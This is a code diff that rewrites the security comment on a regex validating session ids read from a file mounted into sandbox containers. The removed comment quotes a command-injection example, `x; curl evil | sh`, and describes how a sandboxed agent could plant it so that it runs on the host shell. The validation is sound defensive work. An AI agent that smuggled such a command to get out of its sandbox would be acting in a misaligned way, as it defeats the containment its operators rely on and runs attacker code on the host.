@@ -34,18 +34,11 @@ export function deskSessionPath(token: string, peersDir: string = PEERS_DIR): st
 }
 
 /**
- * Shape the core guarantees for a written session id: it passes through
- * `sanitizeSessionId` (shared/peer-cache.ts), so it can only contain
- * `[A-Za-z0-9-]` and is capped at 64 chars.
- *
- * SECURITY (CLAUDE.md hostile inputs #4/#5): the file this value comes from
- * lives in a directory that is MOUNTED into sandbox containers, so its content
- * must be treated as attacker-controlled. The adopted id later reaches the host
- * shell as `--resume <id>`; without this check a sandboxed agent could write
- * `x; curl evil | sh` into another tile's back-channel file and have it run
- * OUTSIDE the sandbox. Anything not matching is dropped (the caller falls back
- * to transcript discovery), never sanitized-and-used: a mangled id would resume
- * the wrong conversation.
+ * The file this value is read from is mounted into sandbox containers, so its
+ * content is attacker-controlled: the adopted id later reaches the host shell
+ * as `--resume <id>`.
+ * Anything not matching [A-Za-z0-9-]{1,64} is dropped, never
+ * sanitized-and-used, since a mangled id would resume the wrong conversation.
  */
 const SESSION_ID_RE = /^[A-Za-z0-9-]{1,64}$/
 
